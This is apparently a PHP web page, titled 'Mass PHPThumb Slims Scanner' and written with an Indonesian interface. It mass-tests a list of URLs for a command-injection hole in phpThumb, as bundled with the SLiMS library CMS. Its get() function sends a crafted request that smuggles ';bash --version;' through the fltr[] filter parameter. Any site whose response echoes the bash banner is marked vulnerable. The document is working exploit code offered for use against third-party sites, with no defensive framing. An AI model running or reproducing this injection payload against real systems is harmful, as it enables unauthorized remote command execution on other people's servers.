<html>
<head>
<title>[+] Mass PHPThumb Slims[+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<body bgcolor="#1e1e1e" text="white" style="max-width: 100%">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');


textarea {
max-width: 90%;
width: 90%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

nemu {
  color: green;
}

kgk {
  color: red;
}

kuning {
  color: yellow;
}
</style>
<body>
<center>
<font face=courier new size=5>Mass PHPThumb Slims Scanner<br><font size="3">Scan Vuln PHPThumb Pada CMS Slims</font><font size="3"><hr>
<form method="post">
<textarea rows=1 name="url" placeholder="https://exploits.my.id/ (only url)" required="true"></textarea><br><br>
<input type="submit" name="go" value="Gaskan">
</form>
<?php
if (isset($_POST['go'])) {
  ob_implicit_flush();ob_end_flush();
  echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
  if (isset($_POST['url'])) {
    $list = explode("\r\n", $_POST['url']);
  } else {
    die("Hadeh ente wkwk");
  }
  foreach ($list as $web) {
    $cek = get($web);
    if (preg_match("/GNU bash, version/i", $cek)) {
      echo "[<nemu>Vuln</nemu>] ".$web."<br>";
    } elseif (preg_match("/DOCUMENT_ROOT/i", $cek)) {
      echo "[<kuning>Not Vuln</kuning>] ".$web."<br>";
    } else {
      echo "[<kgk>Not Found</kgk>] ".$web."<br>";
    }
  }
}
echo "</pre>";

function get($web) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $web."/lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;bash%20--version;%20&phpThumbDebug=9");
  //curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_TIMEOUT, 15);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
  curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  return curl_exec($ch);
}
?>
</font>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>